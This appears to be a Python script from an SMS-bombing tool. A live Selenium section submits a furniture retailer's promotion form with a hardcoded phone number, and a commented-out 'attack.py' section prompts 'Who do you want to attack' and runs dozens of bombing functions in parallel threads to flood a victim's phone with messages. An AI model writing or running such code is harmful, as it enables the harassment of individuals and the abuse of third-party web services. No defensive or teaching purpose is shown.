import time

from selenium import webdriver

options = webdriver.ChromeOptions()
# options.add_argument('--headless')  # 后台模式

browser = webdriver.Chrome(chrome_options=options, executable_path='./chromedriver')
browser.implicitly_wait(8)
browser.get('http://www.homekoo.com/zhixiao/cuxiao/index.php')
browser.find_element_by_xpath('//*[@id="username5"]').send_keys(u'eqweqeqe')
browser.find_element_by_xpath('//*[@id="tel5"]').send_keys('15208491440')
browser.find_element_by_xpath('//*[@id="submit_img5"]').click()
time.sleep(20)
browser.quit()




# encoding=utf8
# attack.py
# from smsbomber import Bomber
# import threading
#
#
# def attack1(phone):
#     func = ['func%d' % i for i in range(0, 15)]
#     for i in func:
#         if hasattr(Bomber, i):
#             try:
#                 getattr(Bomber(phone), i)()
#                 print('%s has excuted!' % i)
#             except Exception as e:
#                 print(e)
#                 print('%s meet some problems!' % i)
#                 continue
#         else:
#             print('There is not %s' % i)
#
#
# def attack2(phone):
#     func = ['func%d' % i for i in range(15, 30)]
#     for i in func:
#         if hasattr(Bomber, i):
#             try:
#                 getattr(Bomber(phone), i)()
#                 print('%s has excuted!' % i)
#             except:
#                 print('%s meet some problems!' % i)
#                 continue
#         else:
#             print('There is not %s' % i)
#
#
# def attack3(phone):
#     func = ['func%d' % i for i in range(30, 45)]
#     for i in func:
#         if hasattr(Bomber, i):
#             try:
#                 getattr(Bomber(phone), i)()
#                 print('%s has excuted!' % i)
#             except:
#                 print('%s meet some problems!' % i)
#                 continue
#         else:
#             print('There is not %s' % i)
#
#
# phone = input('Who do you want to attack:').strip()
# # phone = '01234567890'
# thread1 = threading.Thread(target=attack1, name='thread1', args=(phone,))
# thread2 = threading.Thread(target=attack2, name='thread2', args=(phone,))
# thread3 = threading.Thread(target=attack3, name='thread3', args=(phone,))
# # threading.current_thread().name
# thread1.start()
# thread2.start()
# thread3.start()
# thread1.join()
# thread2.join()
# thread3.join()
# print('已经轰炸完成!')
